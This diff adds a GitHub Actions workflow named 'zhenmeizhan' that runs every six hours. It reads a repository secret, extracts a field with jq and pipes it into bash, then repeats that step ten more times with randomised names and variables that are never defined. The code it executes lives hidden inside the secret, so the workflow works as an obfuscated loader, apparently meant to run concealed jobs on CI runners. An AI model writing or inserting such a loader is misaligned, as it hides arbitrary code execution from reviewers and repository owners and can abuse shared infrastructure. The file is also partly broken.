@@ -1,0 +1,27 @@
+name: zhenmeizhan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhenmeizhan
+        env:
+          ldap53: ${{ secrets.ldap53 }}
+        run: |
+          echo $ldap53 | jq -r .fc5 | /bin/bash
+          echo $edj78280 | jq -r .ejczv8151 | /bin/bash
+          echo $hk4 | jq -r .kqazv9 | /bin/bash
+          echo $o10 | jq -r .i937 | /bin/bash
+          echo $eelun3901 | jq -r .hj92 | /bin/bash
+          echo $bu87 | jq -r .oyzfc3144 | /bin/bash
+          echo $ikqg27574 | jq -r .n3920 | /bin/bash
+          echo $vgh023 | jq -r .mhvme27 | /bin/bash
+          echo $i18 | jq -r .xj81 | /bin/bash
+          echo $ae074 | jq -r .fvt5 | /bin/bash
+          echo $huty1288 | jq -r .sc6 | /bin/bash
+
